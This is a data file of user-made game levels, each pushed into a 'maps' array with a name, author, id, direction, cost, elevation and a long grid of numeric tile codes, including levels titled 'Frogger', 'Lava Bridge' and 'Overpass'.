maps.push({name="frostdrake tower v1",author="TheShy",id="#1692022735",direction="forward",cost=297,elevation=19,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,0,0,0,0,1,20,20,20,1,0,0,40,40,40,40,40,40,1,5,5,153,0,0,0,1,20,20,20,20,40,40,104,40,40,40,40,40,1,5,5,154,0,0,0,1,20,20,20,1,0,0,40,0,0,0,40,0,1,5,5,157,0,0,0,1,20,20,20,1,0,0,103,0,0,0,101,0,1,5,5,0,0,0,0,1,20,20,20,1,0,0,103,0,0,0,101,0,1,6,6,0,0,0,0,1,22,22,22,1,40,40,102,0,0,0,40,0,1,7,7,0,0,0,0,1,20,20,20,1,19,1,1,1,20,20,20,20,1,8,8,0,0,0,0,1,20,20,20,1,18,1,1,1,4,4,4,4,1,9,9,0,0,0,0,1,20,1,20,1,17,1,1,1,14,14,14,14,1,10,10,0,0,0,0,1,20,1,20,1,16,98,16,1,14,14,14,14,1,11,11,0,0,0,0,1,20,1,20,1,16,1,16,1,14,14,14,14,1,12,12,0,0,0,0,1,20,1,20,1,16,1,16,16,16,14,14,14,1,13,13,0,0,0,0,1,20,1,20,1,16,1,16,1,15,14,14,14,96,14,14,14,14,0,0,1,21,1,21,1,99,16,16,1,14,14,14,14,96,14,14,1,14,0,34,1,100,1,22,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,1,189,20,186,1,0,0,0,0,0,0,0,0,0,1,1,1,1,0,34,1,24,152,0,1,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,34,34,0,34,0,34,1,2,2,24,1,0,0,0,0,0,0,0,0,0,97,34,0,0,0,0]});
maps.push({name="Levels",author="NyaaaDoge",id="#1692298992",direction="forward",cost=428,elevation=0,map=[24,49,2,2,49,24,0,24,24,24,24,24,24,0,24,24,24,24,24,24,24,49,49,49,49,24,0,24,49,134,134,49,24,0,24,9,139,139,9,24,24,90,49,49,100,24,0,24,49,49,49,49,24,0,24,9,9,9,9,24,24,49,49,49,49,24,0,24,90,49,49,100,24,0,24,90,9,9,100,24,24,49,49,49,49,24,0,24,49,75,49,49,24,0,24,9,75,85,9,24,24,49,49,49,90,24,0,24,91,91,91,91,24,0,24,91,91,91,91,24,24,49,49,49,49,24,0,24,49,49,49,90,24,0,24,9,9,126,90,24,24,49,131,131,49,24,0,24,49,49,49,49,24,0,24,9,9,9,9,24,24,24,24,24,24,24,0,24,49,136,136,49,24,0,24,9,9,9,9,24,24,24,24,24,24,24,0,24,24,24,24,24,24,0,24,24,49,49,24,24,24,49,132,132,49,24,0,24,24,24,24,24,24,0,24,24,49,49,24,24,24,49,49,49,49,24,0,24,49,137,137,49,24,0,24,24,49,49,24,24,24,90,49,49,100,24,0,24,49,49,49,49,24,0,24,9,9,9,9,24,24,49,49,49,49,24,0,24,90,49,49,100,24,0,24,9,9,9,9,24,24,91,91,91,91,24,0,24,49,75,85,49,24,0,24,90,9,9,100,24,24,49,49,49,90,24,0,24,91,91,91,91,24,0,24,9,75,85,9,24,24,49,49,49,49,24,0,24,49,49,49,90,24,0,24,91,91,91,91,24,24,49,133,133,49,24,0,24,49,49,49,49,24,0,24,9,88,126,90,24,24,24,24,24,24,24,0,24,49,138,138,49,24,0,24,9,9,9,9,24,0,0,0,0,0,0,0,24,24,24,24,24,24,0,24,9,2,2,9,24]});
maps.push({name="Fly over with items",author="NyaaaDoge",id="#1692299033",direction="forward",cost=256,elevation=-7,map=[1,1,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1,1,1,94,44,0,0,0,0,0,0,13,13,0,0,0,0,0,0,44,94,1,0,44,43,43,0,15,15,14,14,13,13,14,14,15,15,0,43,43,44,0,0,0,43,42,42,15,15,14,14,13,13,14,14,15,15,42,42,43,0,0,0,0,0,42,41,41,0,0,0,0,0,0,0,0,41,41,42,0,0,0,0,0,15,15,41,40,40,0,0,0,0,0,0,40,40,41,15,15,0,0,0,0,15,15,0,40,39,39,77,0,0,77,39,39,40,0,15,15,0,0,0,0,15,15,0,0,39,38,38,67,67,38,38,39,0,0,15,15,0,0,0,0,15,15,0,0,0,38,93,37,37,93,38,0,0,0,15,15,0,0,1,44,43,42,41,40,39,38,37,66,66,37,38,39,40,41,42,43,44,1,1,44,43,42,41,40,39,38,37,66,66,37,38,39,40,41,42,43,44,1,0,0,66,66,0,0,0,38,93,37,37,93,38,0,0,0,66,66,0,0,0,0,12,12,0,0,39,38,38,67,67,38,38,39,0,0,12,12,0,0,0,0,10,10,0,40,39,39,77,0,0,77,39,39,40,0,10,10,0,0,0,0,10,10,41,40,40,0,0,0,0,0,0,40,40,41,10,10,0,0,0,0,0,42,41,41,0,0,0,0,0,0,0,0,41,41,42,0,0,0,0,0,43,42,42,9,9,8,7,6,6,7,8,9,9,42,42,43,0,0,0,44,43,43,0,9,9,8,7,6,6,7,8,9,9,0,43,43,44,0,1,94,44,0,0,0,0,0,0,6,6,0,0,0,0,0,0,44,94,1,1,1,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1,1]});
maps.push({name="Haven A",author="NyaaaDoge",id="#1692299073",direction="forward",cost=363,elevation=10,map=[0,1,1,1,1,1,1,1,0,1,1,1,1,1,1,24,90,2,2,90,1,14,14,14,14,14,14,90,1,90,109,109,110,111,112,53,14,14,14,14,1,15,15,14,14,14,14,90,1,109,109,109,110,111,112,53,14,14,14,14,1,56,56,1,14,14,1,1,1,109,109,1,1,1,1,24,14,14,24,24,1,57,57,1,54,54,1,1,90,109,109,90,1,0,24,90,14,14,14,24,1,58,58,1,114,114,1,0,1,110,110,1,0,0,24,14,13,13,14,24,1,59,59,1,114,114,1,0,1,111,111,1,0,0,0,24,12,12,15,24,1,60,60,1,114,114,1,1,1,112,112,1,0,0,0,24,11,11,24,24,1,61,61,1,54,54,24,24,24,53,53,24,0,0,0,24,10,10,24,0,1,62,62,1,14,14,90,14,19,14,14,24,0,0,0,24,10,10,24,0,1,63,63,1,14,14,14,14,14,14,14,24,24,24,0,24,10,10,24,0,1,64,64,1,90,14,14,14,14,14,14,14,14,90,24,24,10,10,24,0,1,64,64,1,19,14,14,21,14,14,14,14,14,14,24,10,10,24,0,0,1,64,64,90,1,34,34,21,34,14,19,19,14,90,24,10,90,24,0,0,0,1,64,64,1,34,19,19,34,14,19,24,24,24,11,10,15,24,0,0,0,1,64,59,54,34,19,34,34,14,14,14,13,12,11,10,10,24,0,0,0,1,64,93,54,34,34,34,34,14,14,14,13,12,11,10,10,24,0,0,0,1,64,59,54,34,34,34,34,14,14,14,13,12,1,10,90,1,0,0,0,1,64,64,1,90,34,34,34,14,14,90,1,1,0,1,1,0,0,0,0,1,2,2,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0]});
maps.push({name="Pearl B",author="NyaaaDoge",id="#1692551465",direction="left",cost=275,elevation=5,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,18,90,12,18,0,1,14,14,1,0,1,0,1,19,19,19,19,19,19,19,12,12,14,19,1,14,14,14,90,1,90,1,12,14,16,12,90,12,12,12,12,12,12,13,13,14,17,14,14,1,112,52,12,12,16,12,12,12,12,20,20,20,12,13,13,14,17,16,14,1,112,52,12,12,12,12,12,12,12,12,12,12,12,13,13,14,14,14,14,1,112,1,32,32,32,90,1,18,18,12,90,12,18,19,1,90,14,14,1,1,112,1,17,32,32,32,1,0,0,18,18,18,93,0,0,1,1,1,0,1,112,1,32,32,32,16,1,67,67,0,0,0,0,0,0,154,9,153,0,1,112,1,90,32,32,32,1,24,24,67,0,0,0,0,0,0,145,0,0,1,112,1,32,18,32,32,1,1,1,24,67,0,0,0,0,0,0,0,0,1,112,52,12,52,12,12,1,90,14,1,0,0,0,0,0,0,0,0,0,1,90,52,12,52,12,12,113,14,85,1,0,0,0,0,0,0,0,0,0,1,1,1,53,53,1,1,1,19,14,1,0,0,0,0,0,0,0,0,0,2,59,59,53,53,53,90,1,15,15,1,0,0,0,0,0,0,0,0,0,2,59,59,53,90,53,53,1,16,16,1,0,0,0,0,0,0,0,0,0,1,58,58,1,1,54,54,1,17,17,1,0,0,0,0,0,0,0,0,0,1,90,58,57,56,55,55,1,93,94,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0,1,1,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE 90 degree turns",author="NyaaaDoge",id="#1692551533",direction="left",cost=150,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,1,36,36,36,36,36,1,14,14,0,0,0,0,0,0,0,0,0,0,0,36,14,14,14,14,14,36,14,14,0,0,0,0,0,0,0,0,0,0,0,36,14,14,14,14,14,36,14,14,0,0,0,0,0,0,0,0,0,0,0,36,14,14,36,14,14,36,14,14,0,0,0,0,0,0,0,0,0,0,0,36,14,14,90,14,14,36,14,14,0,0,0,0,0,0,0,0,0,0,0,36,14,14,36,14,14,36,14,14,0,0,0,0,0,0,0,0,0,0,0,36,14,14,36,14,14,36,14,14,0,0,0,0,0,0,0,0,0,0,0,36,14,14,36,14,14,36,14,14,0,0,0,0,0,0,0,0,0,0,0,36,14,14,36,14,14,36,14,14,0,0,0,0,0,0,0,0,0,0,0,36,14,14,36,14,14,36,14,14,0,0,0,0,0,0,0,0,0,0,0,36,14,14,36,14,14,36,14,14,0,0,0,0,0,0,0,0,0,0,0,36,14,14,36,14,14,36,14,14,0,0,0,0,0,0,2,14,14,14,14,14,14,14,36,14,14,14,14,14,0,0,0,0,0,0,2,14,14,14,14,14,14,14,36,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,36,36,36,1,36,36,36,36,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Going Up",author="NyaaaDoge",id="#1692551560",direction="left",cost=132,elevation=14,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,27,5,5,27,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,6,6,28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,29,7,7,29,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,8,8,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,10,10,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,11,11,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,12,12,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,13,13,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,14,14,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,90,90,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,9,9,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,9,9,31,0,0,0,0,0,0,1,41,40,39,38,37,36,35,34,33,1,9,9,31,0,0,0,2,19,19,19,19,18,17,16,15,14,13,12,11,10,10,10,32,0,0,0,2,19,19,19,19,18,17,16,15,14,13,12,11,10,10,10,32,0,0,0,0,0,0,1,41,40,39,38,37,36,35,34,33,32,32,32,1,0,0,0]});
maps.push({name="Frogger",author="Luffaren",id="#1692752646",direction="forward",cost=236,elevation=0,map=[0,0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,0,19,2,2,0,1,1,1,19,19,19,19,19,19,19,19,1,0,0,0,19,19,19,19,0,1,19,19,19,19,19,19,19,19,1,19,19,19,19,19,19,19,19,19,1,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,89,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,19,1,143,143,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,143,143,19,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,1,19,19,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,19,1,19,19,1,1,67,0,0,0,0,0,0,0,0,0,0,0,67,1,1,1,96,96,0,0,0,0,0,0,145,39,97,0,0,0,0,0,0,0,0,1,96,96,1,1,67,0,0,0,0,0,0,0,0,0,0,0,67,1,1,1,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,19,1,100,19,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,93,19,19,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,1,94,19,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,19,1,96,96,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,96,96,0,0,0,19,19,19,19,19,89,19,19,19,89,19,19,19,19,97,19,19,0,0,0,19,89,19,19,19,19,19,19,19,19,19,19,89,19,19,2,2]});
maps.push({name="SoonTM",author="Luffaren",id="#1693326806",direction="forward",cost=375,elevation=0,map=[24,24,2,2,14,14,14,14,14,14,14,14,14,14,14,24,24,0,0,0,24,14,14,14,14,90,14,14,90,14,14,90,14,14,89,14,24,0,0,0,24,14,94,14,14,24,24,24,24,24,24,24,14,14,14,14,24,0,0,0,24,14,14,14,24,24,0,0,0,0,0,24,24,95,95,95,24,0,0,0,24,94,14,14,24,0,0,0,0,0,0,0,24,14,14,14,24,0,0,0,24,24,96,96,24,24,24,24,24,0,0,0,24,0,0,0,24,0,0,0,24,24,34,34,95,34,90,34,24,24,0,0,24,34,34,34,24,0,0,0,24,34,34,34,95,34,34,34,34,24,24,0,24,34,34,34,24,0,0,0,24,34,34,34,95,34,90,34,34,34,24,24,24,90,34,90,24,0,0,0,24,34,34,34,24,24,24,34,89,34,95,34,34,89,34,34,24,0,0,0,24,34,89,34,24,0,24,24,34,34,95,34,34,34,34,34,24,0,0,0,24,34,34,24,24,0,0,24,24,34,95,34,34,34,34,24,24,5,0,0,24,0,0,0,0,93,34,186,24,24,24,24,98,98,24,24,24,5,5,5,24,114,114,114,24,0,0,24,24,97,114,96,114,114,114,114,24,5,0,0,24,90,114,90,24,0,24,24,114,114,114,96,114,114,93,114,24,0,0,0,24,114,114,114,24,24,24,90,114,114,114,96,114,89,114,114,24,0,5,5,24,114,114,114,24,24,90,114,114,114,114,24,24,114,114,114,24,5,0,0,24,95,95,95,24,114,114,114,114,90,24,24,24,95,95,95,24,0,5,0,24,114,114,114,114,114,89,114,90,24,24,0,24,114,114,114,24,5,0,0,24,24,114,114,114,114,114,114,24,24,0,0,24,89,2,2,24,0,5,5]});
maps.push({name="Wet and wide",author="Luffaren",id="#1693327765",direction="forward",cost=634,elevation=0,map=[24,100,24,189,189,189,189,189,189,2,2,189,189,189,189,189,189,24,100,24,24,24,24,5,5,5,5,5,5,5,5,5,5,5,5,5,5,24,24,24,24,24,65,67,65,65,65,67,146,94,5,146,67,65,65,65,67,65,24,24,93,24,65,67,65,65,65,67,146,5,94,146,67,65,65,65,67,65,24,93,24,24,65,67,65,65,65,67,146,94,5,146,67,65,65,65,67,65,24,24,93,24,65,67,65,65,65,67,146,5,94,146,67,65,65,65,67,65,24,93,24,24,65,67,65,65,65,67,146,5,5,146,67,65,65,65,67,65,24,24,24,24,65,67,65,65,65,67,146,5,5,146,67,65,65,65,67,65,24,24,24,24,65,67,65,65,65,67,146,5,5,146,67,65,65,65,67,65,24,24,24,24,65,67,65,65,65,67,146,5,5,146,67,65,65,65,67,65,24,24,24,24,65,67,65,65,65,67,146,5,5,146,67,65,65,65,67,65,24,24,89,24,65,67,65,65,65,67,146,5,5,146,67,65,65,65,67,65,24,89,24,24,65,67,65,65,65,67,146,5,5,146,67,65,65,65,67,65,24,24,89,24,65,67,65,65,65,67,146,5,5,146,67,65,65,65,67,65,24,89,24,24,65,67,65,65,65,67,146,5,89,146,67,65,65,65,67,65,24,24,24,24,65,67,65,65,65,67,146,89,5,146,67,65,65,65,67,65,24,24,24,24,65,67,65,65,65,67,146,5,89,146,67,65,65,65,67,65,24,24,24,9998,24,24,65,65,65,67,146,89,5,146,67,65,65,65,24,24,9998,24,24,141,5,65,65,65,65,67,189,5,5,189,67,65,65,65,65,5,141,24,24,9998,24,5,67,67,67,90,5,2,2,5,90,67,67,67,5,24,9998,24]});
maps.push({name="Death Pit",author="NyaaaDoge",id="#1693543380",direction="forward",cost=248,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,14,183,14,14,14,14,14,90,14,14,14,14,14,14,14,14,183,90,0,0,14,14,0,77,0,0,0,0,0,0,0,0,0,0,77,0,14,14,0,0,14,14,0,153,9,0,0,0,12,12,0,189,0,0,0,0,14,14,0,0,90,14,0,0,145,0,0,0,11,11,0,16,93,0,97,0,14,14,0,0,14,14,154,155,13,0,34,0,30,30,0,0,0,0,13,186,14,14,0,0,15,15,0,0,0,145,28,0,12,12,0,34,0,0,0,0,15,15,0,0,15,15,0,0,90,0,96,0,10,10,0,0,90,0,0,0,15,15,0,0,14,14,0,0,146,0,0,0,0,0,0,0,146,0,0,0,14,14,0,0,14,14,0,12,11,30,12,10,100,93,10,12,30,11,12,0,14,90,0,0,14,14,0,12,11,30,12,10,50,50,10,12,30,11,12,0,14,14,0,0,15,15,0,0,0,0,0,0,10,10,0,0,0,0,0,0,15,15,0,0,115,115,0,0,0,100,0,0,12,90,0,0,0,90,0,0,115,115,0,1,143,143,0,0,0,90,0,96,30,30,0,0,33,0,0,0,143,143,1,1,115,115,0,0,0,0,0,0,11,11,0,0,0,0,0,0,115,115,1,1,14,14,0,0,0,0,33,0,12,12,146,100,0,0,0,0,14,14,1,1,90,14,0,77,0,0,0,0,12,12,0,0,0,0,77,0,14,14,1,1,14,183,14,14,14,90,14,14,14,14,14,14,14,14,14,14,183,14,1,0,1,14,14,14,14,14,14,14,2,2,14,14,90,14,14,14,90,1,0]});
maps.push({name="Large falls",author="Luffaren",id="#1693592928",direction="left",cost=637,elevation=-19,map=[0,0,0,24,1,1,67,67,1,1,94,24,94,24,94,24,24,2,2,24,0,0,93,24,24,1,1,1,1,24,89,24,89,24,24,24,24,24,24,65,0,93,24,24,89,24,24,24,24,24,24,24,24,24,24,24,24,24,65,67,93,24,89,89,24,89,65,65,65,65,65,65,65,65,65,65,65,65,67,65,65,24,24,24,24,65,67,67,67,67,67,67,67,67,67,67,67,67,65,67,67,65,65,65,65,67,65,65,65,65,65,65,65,65,65,65,65,65,67,0,65,67,67,67,67,65,65,65,65,65,65,65,65,65,65,65,65,65,67,0,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,0,65,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,0,65,65,67,67,67,65,65,65,65,65,65,65,65,65,65,65,67,67,146,146,146,65,65,65,67,65,65,65,65,65,65,65,65,65,65,67,65,67,146,146,146,146,146,65,65,67,67,67,65,65,65,65,65,65,67,65,65,67,146,146,146,146,146,146,65,65,65,65,67,67,67,67,67,67,65,65,65,67,146,146,146,146,146,146,146,146,65,65,65,65,65,65,65,65,65,65,65,67,146,146,146,146,146,146,146,146,65,65,65,65,65,65,65,65,65,65,65,67,146,146,146,146,146,146,146,65,65,65,65,65,65,65,65,65,65,65,65,67,146,146,5,5,146,146,65,65,65,65,65,65,65,65,65,65,65,65,65,67,146,146,2,5,5,5,5,65,65,65,65,65,65,65,65,65,65,65,65,67,146,146,2,5,5,89,5,5,5,5,5,5,5,5,5,5,5,5,5,146,146,146,5,89,5,5,90,5,90,5,90,5,90,5,90,5,90,5,146,146,146,146]});
maps.push({name="Double edged sword",author="Luffaren",id="#1693596869",direction="forward",cost=284,elevation=0,map=[1,94,5,5,5,5,5,5,9998,2,2,9998,5,5,5,5,5,5,94,1,1,13,12,11,10,9,8,7,6,5,5,6,7,8,9,10,11,12,13,1,1,113,1,1,110,1,1,1,1,105,105,1,1,1,1,110,1,1,113,1,1,98,1,1,110,1,1,1,1,96,96,1,1,1,1,110,1,1,98,1,0,33,0,0,30,0,77,77,0,25,25,0,77,77,0,30,0,0,33,0,0,97,0,0,30,0,0,0,0,93,93,0,0,0,0,30,0,0,97,0,0,33,0,0,30,0,0,0,0,100,100,0,0,0,0,30,0,0,33,0,0,33,0,0,30,0,0,0,0,25,25,0,0,0,0,30,0,0,33,0,0,33,0,0,30,0,0,0,0,25,25,0,0,0,0,30,0,0,33,0,0,33,0,0,30,0,0,0,0,25,25,0,0,0,0,30,0,0,33,0,0,33,0,0,30,0,0,0,0,25,25,0,0,0,0,30,0,0,33,0,0,33,0,0,30,0,0,0,0,25,25,0,0,0,0,30,0,0,33,0,0,33,0,0,30,0,0,0,0,25,25,0,0,0,0,30,0,0,33,0,0,33,0,0,30,0,0,0,0,25,25,0,0,0,0,30,0,0,33,0,0,33,0,0,102,0,0,0,0,25,25,0,0,0,0,102,0,0,33,0,0,33,0,0,30,0,67,67,0,25,25,0,67,67,0,30,0,0,33,0,1,98,1,1,101,1,1,1,1,96,96,1,1,1,1,101,1,1,98,1,1,113,1,1,110,1,1,1,1,105,105,1,1,1,1,110,1,1,113,1,1,13,12,11,10,9,8,7,6,5,5,6,7,8,9,10,11,12,13,1,1,99,5,89,5,89,5,5,9998,2,2,9998,5,5,89,5,89,5,99,1]});
maps.push({name="The last pepe of CS1",author="Dogeeri",id="#1693597560",direction="forward",cost=480,elevation=0,map=[38,2,2,103,1,1,0,0,0,89,94,89,0,0,0,0,0,0,0,0,38,38,38,103,144,129,0,0,0,75,89,75,0,0,0,0,0,0,0,0,142,142,142,103,199,199,0,0,0,38,75,38,0,0,0,0,0,153,15,186,75,75,38,38,0,0,0,0,0,38,38,38,0,0,0,157,0,0,0,0,90,75,75,38,0,0,0,0,0,102,102,135,0,0,0,0,0,154,17,186,38,38,75,75,75,38,38,102,102,102,102,135,0,0,0,0,0,0,0,0,90,38,38,75,38,38,102,102,102,102,102,135,0,0,0,0,0,0,0,0,38,38,38,75,38,102,102,0,102,102,102,135,0,0,0,0,0,0,0,0,90,38,38,38,38,102,102,1,102,82,102,135,0,0,0,0,0,0,0,0,38,38,38,38,38,38,102,0,102,82,102,135,0,0,0,0,0,0,0,0,90,38,38,38,38,102,102,0,102,82,102,135,0,0,0,0,0,0,0,0,129,38,38,38,132,104,102,1,102,82,38,38,38,38,103,91,38,24,100,24,90,38,162,162,38,132,102,102,38,38,38,38,38,103,103,91,38,24,94,24,38,38,38,38,38,38,38,38,38,38,38,38,103,103,91,38,38,24,93,24,90,38,38,38,38,38,38,38,38,38,103,103,103,91,38,38,38,24,100,24,38,38,131,38,38,38,38,38,38,103,103,91,91,38,38,38,125,38,38,38,90,38,38,38,38,103,103,103,103,103,91,38,38,38,38,38,38,38,38,38,38,38,38,38,103,103,91,91,91,91,163,166,166,166,166,38,38,38,38,90,90,38,38,103,103,91,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,103,103,91,38,38,24,93,24,38,144,38,144,38,144,38,2,2,38]});
maps.push({name="Lava Bridge",author="sivi",id="#1693675896",direction="forward",cost=299,elevation=8,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,5,1,1,0,189,0,0,0,0,0,0,6,3,14,14,3,0,100,1,1,153,124,77,0,6,0,5,0,0,5,0,0,0,34,34,6,0,37,1,1,155,124,77,0,93,0,0,0,0,0,0,0,6,34,34,0,0,0,1,1,154,124,77,0,93,0,0,0,5,0,0,0,0,34,34,6,0,6,1,1,6,124,77,0,6,0,5,0,0,0,6,0,0,14,14,0,0,38,1,1,1,1,1,0,188,0,0,0,0,0,0,0,6,14,14,0,6,0,1,1,157,0,0,0,0,0,0,0,5,0,0,0,0,34,34,0,6,37,1,1,94,20,0,0,0,0,5,0,0,0,6,0,6,34,34,0,0,0,1,1,90,20,19,18,0,0,0,0,0,0,0,0,0,34,34,6,0,6,1,1,20,20,19,18,18,0,0,5,0,0,6,0,6,14,14,0,0,38,1,1,20,20,21,18,18,0,0,0,0,0,0,0,6,14,14,0,6,0,1,1,20,20,90,17,17,17,0,0,0,0,0,0,0,34,34,0,0,37,1,1,21,21,21,17,16,16,16,141,7,0,0,0,6,34,34,6,0,6,1,1,22,22,22,22,16,90,15,14,7,7,7,0,0,34,34,0,0,36,1,1,22,22,90,22,22,16,15,14,14,14,7,7,7,14,14,0,3,0,1,1,22,22,22,22,22,22,15,14,14,14,14,14,14,14,14,14,14,15,1,1,90,22,22,22,22,88,14,14,14,90,14,14,14,14,90,14,14,94,1,1,22,9998,9998,22,90,22,90,14,14,14,14,90,14,14,14,14,14,90,1,1,1,2,2,122,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Overpass",author="sivi",id="#1693675979",direction="right",cost=518,elevation=8,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,105,105,1,90,113,113,113,90,113,94,113,90,113,113,112,111,111,90,1,1,90,105,1,102,113,113,113,113,113,113,113,113,113,113,112,111,111,111,1,1,105,105,1,1,113,113,1,1,1,1,1,1,113,113,1,1,110,110,1,1,105,105,1,90,185,185,5,1,124,124,1,5,185,185,90,1,109,109,1,1,105,105,1,5,185,185,5,1,65,65,1,5,185,185,5,1,108,108,1,1,105,90,1,88,185,185,5,5,67,67,5,5,185,185,88,1,107,107,1,1,105,105,1,5,185,185,5,5,65,65,5,5,185,185,5,1,106,106,1,1,105,105,1,90,185,185,5,90,65,65,90,5,185,185,90,1,105,105,1,1,105,105,105,5,185,185,5,5,65,65,5,5,185,185,5,95,105,105,1,1,90,105,105,5,185,185,5,5,65,65,5,5,185,185,5,95,105,90,1,1,1,1,1,90,185,185,5,90,65,65,90,5,185,185,90,1,1,1,1,1,90,105,1,5,185,185,5,5,65,65,5,5,185,185,5,1,105,90,1,1,93,105,98,5,185,185,5,5,67,67,5,5,185,185,5,98,105,93,1,1,93,105,98,5,185,185,5,1,65,65,1,5,185,185,5,98,105,93,1,1,90,105,1,90,185,185,5,1,124,124,1,5,185,185,90,1,105,90,1,1,1,1,1,1,101,101,1,1,1,1,1,1,101,101,1,1,1,1,1,1,0,0,1,99,113,113,113,113,113,113,113,113,113,113,113,113,113,113,2,1,0,0,1,90,113,113,113,90,113,94,113,90,113,113,113,90,113,113,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Can ya bounce across",author="Luffaren",id="#1693677897",direction="forward",cost=536,elevation=-19,map=[0,0,0,0,0,0,0,24,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,24,24,24,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,24,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,67,65,65,65,65,65,65,65,65,131,65,65,65,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,65,132,65,65,65,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,65,44,65,65,65,65,65,65,65,65,65,67,67,65,65,5,65,65,65,65,65,65,65,65,65,65,65,65,5,65,65,67,67,65,65,5,65,65,65,65,65,65,65,65,65,65,65,65,5,65,65,67,67,1,105,1,105,1,1,1,1,1,1,1,1,1,1,105,1,105,1,67,67,5,5,5,5,5,5,90,14,65,65,14,90,5,5,5,5,5,5,67,67,65,65,65,65,65,65,5,14,65,65,14,5,65,65,65,65,65,65,67,67,65,65,65,65,65,65,9998,93,14,14,93,9998,65,65,65,65,65,65,67,67,65,65,65,65,65,65,5,5,5,5,5,5,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,0,67,67,67,67,67,67,67,67,2,2,67,67,67,67,67,67,67,67,0]});
